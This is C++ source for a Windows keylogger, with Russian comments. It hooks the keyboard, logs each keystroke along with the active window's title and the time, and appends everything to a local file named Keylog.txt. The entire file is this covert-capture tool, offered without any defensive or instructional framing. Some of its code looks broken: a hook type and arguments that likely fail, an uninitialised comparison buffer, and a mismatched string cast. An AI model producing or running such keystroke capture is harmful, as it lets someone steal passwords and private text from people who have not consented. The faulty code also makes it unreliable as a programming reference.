#include <Windows.h>
#include <time.h>
#include <iostream>
#include <fstream>

#pragma warning(disable:4996)
#pragma warning(disable:4703)
using namespace std;

int Save(int key); //записывает данные в файл и определяет, какая кнопка была нажата

LRESULT __stdcall HookCallback(int nCode, WPARAM wParam, LPARAM lParam); // если какая то клавиша была нажата

HHOOK hook;// идентификатор перехвата функций.

KBDLLHOOKSTRUCT kbStruct; // какая кнопка нажата и получение кода кнопки

ofstream file;

int Save(int key) 
{
	char prevProg[256];

	if (key == 1 || key == 2) //проверка на нажатие клавиш мыши 
		return 0;
	HWND foreground = GetForegroundWindow();

	DWORD threadId;
	HKL keyboardLayout; // раскладка клавиатуры

	if (foreground) // есть какая то программа в активном режиме
	{
		threadId = GetWindowThreadProcessId(foreground, NULL);
		keyboardLayout = GetKeyboardLayout(threadId);

		char crrProg[256];
		GetWindowText(foreground, (LPWSTR)crrProg, 256);

		if (strcmp(crrProg, prevProg) != 0) //сменилась прога
		{
			strcpy_s(prevProg, crrProg);
			time_t t = time(NULL);
			struct tm* tm = localtime(&t);

			char c[64];
			strftime(c, sizeof(c), "%c", tm);
			file << "\n\n\n[Program: " << crrProg << "DateTime: " << c << "]"; // запись новой программы в файл

		}

		

			
		
	}

	cout << key << endl; //клавиша, на котороую происходит нажатие
		//Обработка нестандартных кнопок: Backspace, TAB, Shift ...
	if (key == VK_BACK)
		file << "BACKSPACE";
	else if (key == VK_RETURN)
		file << "\n";
	else if (key == VK_SPACE)
		file << " ";
	else if (key == VK_TAB)
		file << "[TAB]";
	else if (key == VK_SHIFT || key == VK_LSHIFT || key == VK_RSHIFT)
		file << "[SHIFT]";
	else if (key == VK_CONTROL || key == VK_LCONTROL || key == VK_RCONTROL)
		file << "[CNTRL]";
	else if (key == VK_ESCAPE)
		file << "[ESC]";
	else if (key == VK_HOME)
		file << "[HOME]";
	else if (key == VK_LEFT)
		file << "[LEFT]";
	else if (key == VK_RIGHT)
		file << "[RIGHT]";
	else if (key == VK_UP)
		file << "UP";
	else if (key == VK_DOWN)
		file << "[DOWN]";
	else if (key == 190 || key == 110)
		file << ".";
	else if (key == 189 || key == 109)
		file << "-";
	else if (key == 20)
		file << "[CAPS]";
	else // если была нажата обычная кнопка, запишем ее.
	{
		char crrKey;
		bool lower = ((GetKeyState(VK_CAPITAL) & 0x001) != 0); // зажат ли капс
		if ((GetKeyState(VK_SHIFT) & 0x1000) != 0 || (GetKeyState(VK_LSHIFT) & 0x1000) != 0 || (GetKeyState(VK_RSHIFT) & 0x1000) != 0)
		{
			lower = !lower;
		}
		//получим символ кнопки
		crrKey = MapVirtualKeyExA(key, MAPVK_VK_TO_CHAR, keyboardLayout);

		//приведем символ к соответствующему регистру

		if (!lower)
		{
			crrKey = tolower(crrKey); 
		}

		file << char(crrKey);
	}

	file.flush();

	return 0;
}

LRESULT __stdcall HookCallback(int nCode, WPARAM wParam, LPARAM lParam) // если какая то клавиша была нажата
{
	if (nCode >= 0) // было ли совершено какое то действие 
	{
		if (wParam == WM_KEYDOWN) // проверяем, было ли нажатие кнопки
		{
			kbStruct = *((KBDLLHOOKSTRUCT*)lParam);

			Save(kbStruct.vkCode);
		}
	}

	return CallNextHookEx(hook, nCode, wParam, lParam);
} 

int main() 
{
	file.open("Keylog.txt", ios_base::app);

	ShowWindow(FindWindowA("ConsoleWindowClass", NULL), 1); // установим видимость окна консоли

	if (!(hook = SetWindowsHookEx(WH_KEYBOARD, HookCallback, NULL, 0)))
	{
		MessageBox(NULL,L"Something has gone wrong!", L"Error!", MB_ICONERROR);
	}

	MSG message;

	while (true)
	{
		GetMessage(&message, NULL, 0, 0);
	}
}